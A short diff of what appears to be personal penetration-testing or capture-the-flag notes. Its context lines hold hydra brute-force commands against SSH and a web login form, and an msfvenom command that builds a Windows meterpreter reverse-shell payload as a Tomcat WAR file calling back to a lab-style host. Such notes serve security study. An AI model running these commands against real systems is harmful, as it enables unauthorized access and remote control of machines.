@@ -6,7 +6,8 @@ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Password
   hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
   hydra -l floris -P /usr/share/wordlists/rockyou.txt 10.10.10.150 http-post "/index.php:username=^USER^&passwd=^PASS^&Login:Warning"
 
-Msfvenom 
+Msfvenom
+  https://netsec.ws/?p=331 (examples)
   Msfvenom -l formats (list format such as asp, dll, exe, war)
   Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o filename.war
   War files are just like zip files used by Tomcat
